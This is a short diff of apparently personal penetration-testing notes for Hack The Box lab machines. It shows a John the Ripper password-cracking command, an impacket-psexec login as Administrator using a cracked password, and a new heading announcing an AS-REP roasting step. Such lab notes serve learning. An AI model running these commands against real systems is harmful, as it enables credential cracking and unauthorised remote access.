@@ -35,3 +35,6 @@ john --wordlist=/usr/share/wordlists/rockyou.txt admin.txt
 Following command can be use to logib with username and pasword
 
 impacket-psexec active.htb/Administrator:Ticketmaster1968@active.htb
+
+Following command can be use to get the hash of users ( AS-REP Roasting attack: Forest Machine )
+
